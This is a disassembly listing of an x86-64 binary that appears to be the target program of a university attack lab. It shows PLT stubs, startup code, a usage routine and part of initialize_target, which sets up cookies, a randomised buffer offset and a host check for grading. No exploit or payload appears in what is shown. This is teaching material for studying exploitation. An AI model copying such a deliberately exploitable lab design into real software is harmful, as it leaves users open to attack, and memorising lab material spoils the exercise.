```c
Disassembly of section .init:

0000000000401000 <_init>:
  401000:       f3 0f 1e fa             endbr64
  401004:       48 83 ec 08             sub    $0x8,%rsp
  401008:       48 8b 05 e9 5f 00 00    mov    0x5fe9(%rip),%rax        # 406ff8 <__gmon_start__@Base>
  40100f:       48 85 c0                test   %rax,%rax
  401012:       74 02                   je     401016 <_init+0x16>
  401014:       ff d0                   call   *%rax
  401016:       48 83 c4 08             add    $0x8,%rsp
  40101a:       c3                      ret

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:       ff 35 e2 5f 00 00       push   0x5fe2(%rip)        # 407008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:       f2 ff 25 e3 5f 00 00    bnd jmp *0x5fe3(%rip)        # 407010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:       0f 1f 00                nopl   (%rax)
  401030:       f3 0f 1e fa             endbr64
  401034:       68 00 00 00 00          push   $0x0
  401039:       f2 e9 e1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40103f:       90                      nop
  401040:       f3 0f 1e fa             endbr64
  401044:       68 01 00 00 00          push   $0x1
  401049:       f2 e9 d1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40104f:       90                      nop
  401050:       f3 0f 1e fa             endbr64
  401054:       68 02 00 00 00          push   $0x2
  401059:       f2 e9 c1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40105f:       90                      nop
  401060:       f3 0f 1e fa             endbr64
  401064:       68 03 00 00 00          push   $0x3
  401069:       f2 e9 b1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40106f:       90                      nop
  401070:       f3 0f 1e fa             endbr64
  401074:       68 04 00 00 00          push   $0x4
  401079:       f2 e9 a1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40107f:       90                      nop
  401080:       f3 0f 1e fa             endbr64
  401084:       68 05 00 00 00          push   $0x5
  401089:       f2 e9 91 ff ff ff       bnd jmp 401020 <_init+0x20>
  40108f:       90                      nop
  401090:       f3 0f 1e fa             endbr64
  401094:       68 06 00 00 00          push   $0x6
  401099:       f2 e9 81 ff ff ff       bnd jmp 401020 <_init+0x20>
  40109f:       90                      nop
  4010a0:       f3 0f 1e fa             endbr64
  4010a4:       68 07 00 00 00          push   $0x7
  4010a9:       f2 e9 71 ff ff ff       bnd jmp 401020 <_init+0x20>
  4010af:       90                      nop
  4010b0:       f3 0f 1e fa             endbr64
  4010b4:       68 08 00 00 00          push   $0x8
  4010b9:       f2 e9 61 ff ff ff       bnd jmp 401020 <_init+0x20>
  4010bf:       90                      nop
  4010c0:       f3 0f 1e fa             endbr64
  4010c4:       68 09 00 00 00          push   $0x9
  4010c9:       f2 e9 51 ff ff ff       bnd jmp 401020 <_init+0x20>
  4010cf:       90                      nop
  4010d0:       f3 0f 1e fa             endbr64
  4010d4:       68 0a 00 00 00          push   $0xa
  4010d9:       f2 e9 41 ff ff ff       bnd jmp 401020 <_init+0x20>
  4010df:       90                      nop
  4010e0:       f3 0f 1e fa             endbr64
  4010e4:       68 0b 00 00 00          push   $0xb
  4010e9:       f2 e9 31 ff ff ff       bnd jmp 401020 <_init+0x20>
  4010ef:       90                      nop
  4010f0:       f3 0f 1e fa             endbr64
  4010f4:       68 0c 00 00 00          push   $0xc
  4010f9:       f2 e9 21 ff ff ff       bnd jmp 401020 <_init+0x20>
  4010ff:       90                      nop
  401100:       f3 0f 1e fa             endbr64
  401104:       68 0d 00 00 00          push   $0xd
  401109:       f2 e9 11 ff ff ff       bnd jmp 401020 <_init+0x20>
  40110f:       90                      nop
  401110:       f3 0f 1e fa             endbr64
  401114:       68 0e 00 00 00          push   $0xe
  401119:       f2 e9 01 ff ff ff       bnd jmp 401020 <_init+0x20>
  40111f:       90                      nop
  401120:       f3 0f 1e fa             endbr64
  401124:       68 0f 00 00 00          push   $0xf
  401129:       f2 e9 f1 fe ff ff       bnd jmp 401020 <_init+0x20>
  40112f:       90                      nop
  401130:       f3 0f 1e fa             endbr64
  401134:       68 10 00 00 00          push   $0x10
  401139:       f2 e9 e1 fe ff ff       bnd jmp 401020 <_init+0x20>
  40113f:       90                      nop
  401140:       f3 0f 1e fa             endbr64
  401144:       68 11 00 00 00          push   $0x11
  401149:       f2 e9 d1 fe ff ff       bnd jmp 401020 <_init+0x20>
  40114f:       90                      nop
  401150:       f3 0f 1e fa             endbr64
  401154:       68 12 00 00 00          push   $0x12
  401159:       f2 e9 c1 fe ff ff       bnd jmp 401020 <_init+0x20>
  40115f:       90                      nop
  401160:       f3 0f 1e fa             endbr64
  401164:       68 13 00 00 00          push   $0x13
  401169:       f2 e9 b1 fe ff ff       bnd jmp 401020 <_init+0x20>
  40116f:       90                      nop
  401170:       f3 0f 1e fa             endbr64
  401174:       68 14 00 00 00          push   $0x14
  401179:       f2 e9 a1 fe ff ff       bnd jmp 401020 <_init+0x20>
  40117f:       90                      nop
  401180:       f3 0f 1e fa             endbr64
  401184:       68 15 00 00 00          push   $0x15
  401189:       f2 e9 91 fe ff ff       bnd jmp 401020 <_init+0x20>
  40118f:       90                      nop
  401190:       f3 0f 1e fa             endbr64
  401194:       68 16 00 00 00          push   $0x16
  401199:       f2 e9 81 fe ff ff       bnd jmp 401020 <_init+0x20>
  40119f:       90                      nop
  4011a0:       f3 0f 1e fa             endbr64
  4011a4:       68 17 00 00 00          push   $0x17
  4011a9:       f2 e9 71 fe ff ff       bnd jmp 401020 <_init+0x20>
  4011af:       90                      nop
  4011b0:       f3 0f 1e fa             endbr64
  4011b4:       68 18 00 00 00          push   $0x18
  4011b9:       f2 e9 61 fe ff ff       bnd jmp 401020 <_init+0x20>
  4011bf:       90                      nop
  4011c0:       f3 0f 1e fa             endbr64
  4011c4:       68 19 00 00 00          push   $0x19
  4011c9:       f2 e9 51 fe ff ff       bnd jmp 401020 <_init+0x20>
  4011cf:       90                      nop
  4011d0:       f3 0f 1e fa             endbr64
  4011d4:       68 1a 00 00 00          push   $0x1a
  4011d9:       f2 e9 41 fe ff ff       bnd jmp 401020 <_init+0x20>
  4011df:       90                      nop
  4011e0:       f3 0f 1e fa             endbr64
  4011e4:       68 1b 00 00 00          push   $0x1b
  4011e9:       f2 e9 31 fe ff ff       bnd jmp 401020 <_init+0x20>
  4011ef:       90                      nop
  4011f0:       f3 0f 1e fa             endbr64
  4011f4:       68 1c 00 00 00          push   $0x1c
  4011f9:       f2 e9 21 fe ff ff       bnd jmp 401020 <_init+0x20>
  4011ff:       90                      nop
  401200:       f3 0f 1e fa             endbr64
  401204:       68 1d 00 00 00          push   $0x1d
  401209:       f2 e9 11 fe ff ff       bnd jmp 401020 <_init+0x20>
  40120f:       90                      nop
  401210:       f3 0f 1e fa             endbr64
  401214:       68 1e 00 00 00          push   $0x1e
  401219:       f2 e9 01 fe ff ff       bnd jmp 401020 <_init+0x20>
  40121f:       90                      nop
  401220:       f3 0f 1e fa             endbr64
  401224:       68 1f 00 00 00          push   $0x1f
  401229:       f2 e9 f1 fd ff ff       bnd jmp 401020 <_init+0x20>
  40122f:       90                      nop
  401230:       f3 0f 1e fa             endbr64
  401234:       68 20 00 00 00          push   $0x20
  401239:       f2 e9 e1 fd ff ff       bnd jmp 401020 <_init+0x20>
  40123f:       90                      nop
  401240:       f3 0f 1e fa             endbr64
  401244:       68 21 00 00 00          push   $0x21
  401249:       f2 e9 d1 fd ff ff       bnd jmp 401020 <_init+0x20>
  40124f:       90                      nop
  401250:       f3 0f 1e fa             endbr64
  401254:       68 22 00 00 00          push   $0x22
  401259:       f2 e9 c1 fd ff ff       bnd jmp 401020 <_init+0x20>
  40125f:       90                      nop

Disassembly of section .plt.sec:

0000000000401260 <strcasecmp@plt>:
  401260:       f3 0f 1e fa             endbr64
  401264:       f2 ff 25 ad 5d 00 00    bnd jmp *0x5dad(%rip)        # 407018 <strcasecmp@GLIBC_2.2.5>
  40126b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401270 <__errno_location@plt>:
  401270:       f3 0f 1e fa             endbr64
  401274:       f2 ff 25 a5 5d 00 00    bnd jmp *0x5da5(%rip)        # 407020 <__errno_location@GLIBC_2.2.5>
  40127b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401280 <srandom@plt>:
  401280:       f3 0f 1e fa             endbr64
  401284:       f2 ff 25 9d 5d 00 00    bnd jmp *0x5d9d(%rip)        # 407028 <srandom@GLIBC_2.2.5>
  40128b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401290 <strncmp@plt>:
  401290:       f3 0f 1e fa             endbr64
  401294:       f2 ff 25 95 5d 00 00    bnd jmp *0x5d95(%rip)        # 407030 <strncmp@GLIBC_2.2.5>
  40129b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004012a0 <strcpy@plt>:
  4012a0:       f3 0f 1e fa             endbr64
  4012a4:       f2 ff 25 8d 5d 00 00    bnd jmp *0x5d8d(%rip)        # 407038 <strcpy@GLIBC_2.2.5>
  4012ab:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004012b0 <__read_chk@plt>:
  4012b0:       f3 0f 1e fa             endbr64
  4012b4:       f2 ff 25 85 5d 00 00    bnd jmp *0x5d85(%rip)        # 407040 <__read_chk@GLIBC_2.4>
  4012bb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004012c0 <puts@plt>:
  4012c0:       f3 0f 1e fa             endbr64
  4012c4:       f2 ff 25 7d 5d 00 00    bnd jmp *0x5d7d(%rip)        # 407048 <puts@GLIBC_2.2.5>
  4012cb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004012d0 <write@plt>:
  4012d0:       f3 0f 1e fa             endbr64
  4012d4:       f2 ff 25 75 5d 00 00    bnd jmp *0x5d75(%rip)        # 407050 <write@GLIBC_2.2.5>
  4012db:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004012e0 <strlen@plt>:
  4012e0:       f3 0f 1e fa             endbr64
  4012e4:       f2 ff 25 6d 5d 00 00    bnd jmp *0x5d6d(%rip)        # 407058 <strlen@GLIBC_2.2.5>
  4012eb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004012f0 <__stack_chk_fail@plt>:
  4012f0:       f3 0f 1e fa             endbr64
  4012f4:       f2 ff 25 65 5d 00 00    bnd jmp *0x5d65(%rip)        # 407060 <__stack_chk_fail@GLIBC_2.4>
  4012fb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401300 <mmap@plt>:
  401300:       f3 0f 1e fa             endbr64
  401304:       f2 ff 25 5d 5d 00 00    bnd jmp *0x5d5d(%rip)        # 407068 <mmap@GLIBC_2.2.5>
  40130b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401310 <memset@plt>:
  401310:       f3 0f 1e fa             endbr64
  401314:       f2 ff 25 55 5d 00 00    bnd jmp *0x5d55(%rip)        # 407070 <memset@GLIBC_2.2.5>
  40131b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401320 <alarm@plt>:
  401320:       f3 0f 1e fa             endbr64
  401324:       f2 ff 25 4d 5d 00 00    bnd jmp *0x5d4d(%rip)        # 407078 <alarm@GLIBC_2.2.5>
  40132b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401330 <close@plt>:
  401330:       f3 0f 1e fa             endbr64
  401334:       f2 ff 25 45 5d 00 00    bnd jmp *0x5d45(%rip)        # 407080 <close@GLIBC_2.2.5>
  40133b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401340 <strcmp@plt>:
  401340:       f3 0f 1e fa             endbr64
  401344:       f2 ff 25 3d 5d 00 00    bnd jmp *0x5d3d(%rip)        # 407088 <strcmp@GLIBC_2.2.5>
  40134b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401350 <signal@plt>:
  401350:       f3 0f 1e fa             endbr64
  401354:       f2 ff 25 35 5d 00 00    bnd jmp *0x5d35(%rip)        # 407090 <signal@GLIBC_2.2.5>
  40135b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401360 <gethostbyname@plt>:
  401360:       f3 0f 1e fa             endbr64
  401364:       f2 ff 25 2d 5d 00 00    bnd jmp *0x5d2d(%rip)        # 407098 <gethostbyname@GLIBC_2.2.5>
  40136b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401370 <__memmove_chk@plt>:
  401370:       f3 0f 1e fa             endbr64
  401374:       f2 ff 25 25 5d 00 00    bnd jmp *0x5d25(%rip)        # 4070a0 <__memmove_chk@GLIBC_2.3.4>
  40137b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401380 <strtol@plt>:
  401380:       f3 0f 1e fa             endbr64
  401384:       f2 ff 25 1d 5d 00 00    bnd jmp *0x5d1d(%rip)        # 4070a8 <strtol@GLIBC_2.2.5>
  40138b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401390 <memcpy@plt>:
  401390:       f3 0f 1e fa             endbr64
  401394:       f2 ff 25 15 5d 00 00    bnd jmp *0x5d15(%rip)        # 4070b0 <memcpy@GLIBC_2.14>
  40139b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004013a0 <time@plt>:
  4013a0:       f3 0f 1e fa             endbr64
  4013a4:       f2 ff 25 0d 5d 00 00    bnd jmp *0x5d0d(%rip)        # 4070b8 <time@GLIBC_2.2.5>
  4013ab:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004013b0 <random@plt>:
  4013b0:       f3 0f 1e fa             endbr64
  4013b4:       f2 ff 25 05 5d 00 00    bnd jmp *0x5d05(%rip)        # 4070c0 <random@GLIBC_2.2.5>
  4013bb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004013c0 <__isoc99_sscanf@plt>:
  4013c0:       f3 0f 1e fa             endbr64
  4013c4:       f2 ff 25 fd 5c 00 00    bnd jmp *0x5cfd(%rip)        # 4070c8 <__isoc99_sscanf@GLIBC_2.7>
  4013cb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004013d0 <munmap@plt>:
  4013d0:       f3 0f 1e fa             endbr64
  4013d4:       f2 ff 25 f5 5c 00 00    bnd jmp *0x5cf5(%rip)        # 4070d0 <munmap@GLIBC_2.2.5>
  4013db:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004013e0 <__printf_chk@plt>:
  4013e0:       f3 0f 1e fa             endbr64
  4013e4:       f2 ff 25 ed 5c 00 00    bnd jmp *0x5ced(%rip)        # 4070d8 <__printf_chk@GLIBC_2.3.4>
  4013eb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004013f0 <fopen@plt>:
  4013f0:       f3 0f 1e fa             endbr64
  4013f4:       f2 ff 25 e5 5c 00 00    bnd jmp *0x5ce5(%rip)        # 4070e0 <fopen@GLIBC_2.2.5>
  4013fb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401400 <getopt@plt>:
  401400:       f3 0f 1e fa             endbr64
  401404:       f2 ff 25 dd 5c 00 00    bnd jmp *0x5cdd(%rip)        # 4070e8 <getopt@GLIBC_2.2.5>
  40140b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401410 <strtoul@plt>:
  401410:       f3 0f 1e fa             endbr64
  401414:       f2 ff 25 d5 5c 00 00    bnd jmp *0x5cd5(%rip)        # 4070f0 <strtoul@GLIBC_2.2.5>
  40141b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401420 <gethostname@plt>:
  401420:       f3 0f 1e fa             endbr64
  401424:       f2 ff 25 cd 5c 00 00    bnd jmp *0x5ccd(%rip)        # 4070f8 <gethostname@GLIBC_2.2.5>
  40142b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401430 <exit@plt>:
  401430:       f3 0f 1e fa             endbr64
  401434:       f2 ff 25 c5 5c 00 00    bnd jmp *0x5cc5(%rip)        # 407100 <exit@GLIBC_2.2.5>
  40143b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401440 <connect@plt>:
  401440:       f3 0f 1e fa             endbr64
  401444:       f2 ff 25 bd 5c 00 00    bnd jmp *0x5cbd(%rip)        # 407108 <connect@GLIBC_2.2.5>
  40144b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401450 <__fprintf_chk@plt>:
  401450:       f3 0f 1e fa             endbr64
  401454:       f2 ff 25 b5 5c 00 00    bnd jmp *0x5cb5(%rip)        # 407110 <__fprintf_chk@GLIBC_2.3.4>
  40145b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401460 <getc@plt>:
  401460:       f3 0f 1e fa             endbr64
  401464:       f2 ff 25 ad 5c 00 00    bnd jmp *0x5cad(%rip)        # 407118 <getc@GLIBC_2.2.5>
  40146b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401470 <__sprintf_chk@plt>:
  401470:       f3 0f 1e fa             endbr64
  401474:       f2 ff 25 a5 5c 00 00    bnd jmp *0x5ca5(%rip)        # 407120 <__sprintf_chk@GLIBC_2.3.4>
  40147b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401480 <socket@plt>:
  401480:       f3 0f 1e fa             endbr64
  401484:       f2 ff 25 9d 5c 00 00    bnd jmp *0x5c9d(%rip)        # 407128 <socket@GLIBC_2.2.5>
  40148b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

Disassembly of section .text:

0000000000401490 <_start>:
  401490:       f3 0f 1e fa             endbr64
  401494:       31 ed                   xor    %ebp,%ebp
  401496:       49 89 d1                mov    %rdx,%r9
  401499:       5e                      pop    %rsi
  40149a:       48 89 e2                mov    %rsp,%rdx
  40149d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  4014a1:       50                      push   %rax
  4014a2:       54                      push   %rsp
  4014a3:       45 31 c0                xor    %r8d,%r8d
  4014a6:       31 c9                   xor    %ecx,%ecx
  4014a8:       48 c7 c7 b7 17 40 00    mov    $0x4017b7,%rdi
  4014af:       ff 15 3b 5b 00 00       call   *0x5b3b(%rip)        # 406ff0 <__libc_start_main@GLIBC_2.34>
  4014b5:       f4                      hlt
  4014b6:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  4014bd:       00 00 00

00000000004014c0 <_dl_relocate_static_pie>:
  4014c0:       f3 0f 1e fa             endbr64
  4014c4:       c3                      ret
  4014c5:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  4014cc:       00 00 00
  4014cf:       90                      nop

00000000004014d0 <deregister_tm_clones>:
  4014d0:       b8 b8 74 40 00          mov    $0x4074b8,%eax
  4014d5:       48 3d b8 74 40 00       cmp    $0x4074b8,%rax
  4014db:       74 13                   je     4014f0 <deregister_tm_clones+0x20>
  4014dd:       b8 00 00 00 00          mov    $0x0,%eax
  4014e2:       48 85 c0                test   %rax,%rax
  4014e5:       74 09                   je     4014f0 <deregister_tm_clones+0x20>
  4014e7:       bf b8 74 40 00          mov    $0x4074b8,%edi
  4014ec:       ff e0                   jmp    *%rax
  4014ee:       66 90                   xchg   %ax,%ax
  4014f0:       c3                      ret
  4014f1:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
  4014f8:       00 00 00 00
  4014fc:       0f 1f 40 00             nopl   0x0(%rax)

0000000000401500 <register_tm_clones>:
  401500:       be b8 74 40 00          mov    $0x4074b8,%esi
  401505:       48 81 ee b8 74 40 00    sub    $0x4074b8,%rsi
  40150c:       48 89 f0                mov    %rsi,%rax
  40150f:       48 c1 ee 3f             shr    $0x3f,%rsi
  401513:       48 c1 f8 03             sar    $0x3,%rax
  401517:       48 01 c6                add    %rax,%rsi
  40151a:       48 d1 fe                sar    %rsi
  40151d:       74 11                   je     401530 <register_tm_clones+0x30>
  40151f:       b8 00 00 00 00          mov    $0x0,%eax
  401524:       48 85 c0                test   %rax,%rax
  401527:       74 07                   je     401530 <register_tm_clones+0x30>
  401529:       bf b8 74 40 00          mov    $0x4074b8,%edi
  40152e:       ff e0                   jmp    *%rax
  401530:       c3                      ret
  401531:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
  401538:       00 00 00 00
  40153c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000401540 <__do_global_dtors_aux>:
  401540:       f3 0f 1e fa             endbr64
  401544:       80 3d bd 5f 00 00 00    cmpb   $0x0,0x5fbd(%rip)        # 407508 <completed.0>
  40154b:       75 13                   jne    401560 <__do_global_dtors_aux+0x20>
  40154d:       55                      push   %rbp
  40154e:       48 89 e5                mov    %rsp,%rbp
  401551:       e8 7a ff ff ff          call   4014d0 <deregister_tm_clones>
  401556:       c6 05 ab 5f 00 00 01    movb   $0x1,0x5fab(%rip)        # 407508 <completed.0>
  40155d:       5d                      pop    %rbp
  40155e:       c3                      ret
  40155f:       90                      nop
  401560:       c3                      ret
  401561:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
  401568:       00 00 00 00
  40156c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000401570 <frame_dummy>:
  401570:       f3 0f 1e fa             endbr64
  401574:       eb 8a                   jmp    401500 <register_tm_clones>

0000000000401576 <usage>:
  401576:       50                      push   %rax
  401577:       58                      pop    %rax
  401578:       48 83 ec 08             sub    $0x8,%rsp
  40157c:       48 89 fa                mov    %rdi,%rdx
  40157f:       83 3d d2 5f 00 00 00    cmpl   $0x0,0x5fd2(%rip)        # 407558 <is_checker>
  401586:       74 50                   je     4015d8 <usage+0x62>
  401588:       48 8d 35 79 2a 00 00    lea    0x2a79(%rip),%rsi        # 404008 <_IO_stdin_used+0x8>
  40158f:       bf 01 00 00 00          mov    $0x1,%edi
  401594:       b8 00 00 00 00          mov    $0x0,%eax
  401599:       e8 42 fe ff ff          call   4013e0 <__printf_chk@plt>
  40159e:       48 8d 3d 9b 2a 00 00    lea    0x2a9b(%rip),%rdi        # 404040 <_IO_stdin_used+0x40>
  4015a5:       e8 16 fd ff ff          call   4012c0 <puts@plt>
  4015aa:       48 8d 3d 07 2c 00 00    lea    0x2c07(%rip),%rdi        # 4041b8 <_IO_stdin_used+0x1b8>
  4015b1:       e8 0a fd ff ff          call   4012c0 <puts@plt>
  4015b6:       48 8d 3d ab 2a 00 00    lea    0x2aab(%rip),%rdi        # 404068 <_IO_stdin_used+0x68>
  4015bd:       e8 fe fc ff ff          call   4012c0 <puts@plt>
  4015c2:       48 8d 3d 09 2c 00 00    lea    0x2c09(%rip),%rdi        # 4041d2 <_IO_stdin_used+0x1d2>
  4015c9:       e8 f2 fc ff ff          call   4012c0 <puts@plt>
  4015ce:       bf 00 00 00 00          mov    $0x0,%edi
  4015d3:       e8 58 fe ff ff          call   401430 <exit@plt>
  4015d8:       48 8d 35 0f 2c 00 00    lea    0x2c0f(%rip),%rsi        # 4041ee <_IO_stdin_used+0x1ee>
  4015df:       bf 01 00 00 00          mov    $0x1,%edi
  4015e4:       b8 00 00 00 00          mov    $0x0,%eax
  4015e9:       e8 f2 fd ff ff          call   4013e0 <__printf_chk@plt>
  4015ee:       48 8d 3d 9b 2a 00 00    lea    0x2a9b(%rip),%rdi        # 404090 <_IO_stdin_used+0x90>
  4015f5:       e8 c6 fc ff ff          call   4012c0 <puts@plt>
  4015fa:       48 8d 3d b7 2a 00 00    lea    0x2ab7(%rip),%rdi        # 4040b8 <_IO_stdin_used+0xb8>
  401601:       e8 ba fc ff ff          call   4012c0 <puts@plt>
  401606:       48 8d 3d ff 2b 00 00    lea    0x2bff(%rip),%rdi        # 40420c <_IO_stdin_used+0x20c>
  40160d:       e8 ae fc ff ff          call   4012c0 <puts@plt>
  401612:       eb ba                   jmp    4015ce <usage+0x58>

0000000000401614 <initialize_target>:
  401614:       55                      push   %rbp
  401615:       53                      push   %rbx
  401616:       48 81 ec 00 10 00 00    sub    $0x1000,%rsp
  40161d:       48 83 0c 24 00          orq    $0x0,(%rsp)
  401622:       48 81 ec 00 10 00 00    sub    $0x1000,%rsp
  401629:       48 83 0c 24 00          orq    $0x0,(%rsp)
  40162e:       48 81 ec 18 01 00 00    sub    $0x118,%rsp
  401635:       89 f5                   mov    %esi,%ebp
  401637:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  40163e:       00 00
  401640:       48 89 84 24 08 21 00    mov    %rax,0x2108(%rsp)
  401647:       00
  401648:       31 c0                   xor    %eax,%eax
  40164a:       89 3d f8 5e 00 00       mov    %edi,0x5ef8(%rip)        # 407548 <check_level>
  401650:       8b 3d fa 5a 00 00       mov    0x5afa(%rip),%edi        # 407150 <target_id>
  401656:       e8 f3 20 00 00          call   40374e <gencookie>
  40165b:       89 c7                   mov    %eax,%edi
  40165d:       89 05 f1 5e 00 00       mov    %eax,0x5ef1(%rip)        # 407554 <cookie>
  401663:       e8 e6 20 00 00          call   40374e <gencookie>
  401668:       89 05 e2 5e 00 00       mov    %eax,0x5ee2(%rip)        # 407550 <authkey>
  40166e:       8b 05 dc 5a 00 00       mov    0x5adc(%rip),%eax        # 407150 <target_id>
  401674:       8d 78 01                lea    0x1(%rax),%edi
  401677:       e8 04 fc ff ff          call   401280 <srandom@plt>
  40167c:       e8 2f fd ff ff          call   4013b0 <random@plt>
  401681:       89 c7                   mov    %eax,%edi
  401683:       e8 1f 03 00 00          call   4019a7 <scramble>
  401688:       89 c3                   mov    %eax,%ebx
  40168a:       85 ed                   test   %ebp,%ebp
  40168c:       75 54                   jne    4016e2 <initialize_target+0xce>
  40168e:       b8 00 00 00 00          mov    $0x0,%eax
  401693:       01 d8                   add    %ebx,%eax
  401695:       0f b7 c0                movzwl %ax,%eax
  401698:       8d 04 c5 00 01 00 00    lea    0x100(,%rax,8),%eax
  40169f:       89 c0                   mov    %eax,%eax
  4016a1:       48 89 05 08 5e 00 00    mov    %rax,0x5e08(%rip)        # 4074b0 <buf_offset>
  4016a8:       c6 05 89 5e 00 00 72    movb   $0x72,0x5e89(%rip)        # 407538 <target_prefix>
  4016af:       83 3d f2 5d 00 00 00    cmpl   $0x0,0x5df2(%rip)        # 4074a8 <notify>
  4016b6:       74 09                   je     4016c1 <initialize_target+0xad>
  4016b8:       83 3d 99 5e 00 00 00    cmpl   $0x0,0x5e99(%rip)        # 407558 <is_checker>
  4016bf:       74 39                   je     4016fa <initialize_target+0xe6>
  4016c1:       48 8b 84 24 08 21 00    mov    0x2108(%rsp),%rax
  4016c8:       00
  4016c9:       64 48 2b 04 25 28 00    sub    %fs:0x28,%rax
  4016d0:       00 00
  4016d2:       0f 85 da 00 00 00       jne    4017b2 <initialize_target+0x19e>
  4016d8:       48 81 c4 18 21 00 00    add    $0x2118,%rsp
  4016df:       5b                      pop    %rbx
  4016e0:       5d                      pop    %rbp
  4016e1:       c3                      ret
  4016e2:       bf 00 00 00 00          mov    $0x0,%edi
  4016e7:       e8 b4 fc ff ff          call   4013a0 <time@plt>
  4016ec:       89 c7                   mov    %eax,%edi
  4016ee:       e8 8d fb ff ff          call   401280 <srandom@plt>
  4016f3:       e8 b8 fc ff ff          call   4013b0 <random@plt>
  4016f8:       eb 99                   jmp    401693 <initialize_target+0x7f>
  4016fa:       48 89 e7                mov    %rsp,%rdi
  4016fd:       be 00 01 00 00          mov    $0x100,%esi
  401702:       e8 19 fd ff ff          call   401420 <gethostname@plt>
  401707:       89 c5                   mov    %eax,%ebp
  401709:       85 c0                   test   %eax,%eax
  40170b:       75 26                   jne    401733 <initialize_target+0x11f>
  40170d:       89 c3                   mov    %eax,%ebx
  40170f:       48 63 c3                movslq %ebx,%rax
  401712:       48 8d 15 67 5a 00 00    lea    0x5a67(%rip),%rdx        # 407180 <host_table>
  401719:       48 8b 3c c2             mov    (%rdx,%rax,8),%rdi
  40171d:       48 85 ff                test   %rdi,%rdi
  401720:       74 2c                   je     40174e <initialize_target+0x13a>
  401722:       48 89 e6                mov    %rsp,%rsi
  401725:       e8 36 fb ff ff          call   401260 <strcasecmp@plt>
  40172a:       85 c0                   test   %eax,%eax
  40172c:       74 1b                   je     401749 <initialize_target+0x135>
  40172e:       83 c3 01                add    $0x1,%ebx
  401731:       eb dc                   jmp    40170f <initialize_target+0xfb>
  401733:       48 8d 3d ae 29 00 00    lea    0x29ae(%rip),%rdi        # 4040e8 <_IO_stdin_used+0xe8>
  40173a:       e8 81 fb ff ff          call   4012c0 <puts@plt>
  40173f:       bf 08 00 00 00          mov    $0x8,%edi
  401744:       e8 e7 fc ff ff          call   401430 <exit@plt>
  401749:       bd 01 00 00 00          mov    $0x1,%ebp
  40174e:       85 ed                   test   %ebp,%ebp
  401750:       74 3d                   je     40178f <initialize_target+0x17b>
  401752:       48 8d bc 24 00 01 00    lea    0x100(%rsp),%rdi
  401759:       00
  40175a:       e8 15 1d 00 00          call   403474 <init_driver>
  40175f:       85 c0                   test   %eax,%eax
  401761:       0f 89 5a ff ff ff       jns    4016c1 <initialize_target+0xad>
  401767:       48 8d 94 24 00 01 00    lea    0x100(%rsp),%rdx
  40176e:       00
  40176f:       48 8d 35 ea 29 00 00    lea    0x29ea(%rip),%rsi        # 404160 <_IO_stdin_used+0x160>
  401776:       bf 01 00 00 00          mov    $0x1,%edi
  40177b:       b8 00 00 00 00          mov    $0x0,%eax
  401780:       e8 5b fc ff ff          call   4013e0 <__printf_chk@plt>
  401785:       bf 08 00 00 00          mov    $0x8,%edi
  40178a:       e8 a1 fc ff ff          call   401430 <exit@plt>
  40178f:       48 89 e2                mov    %rsp,%rdx
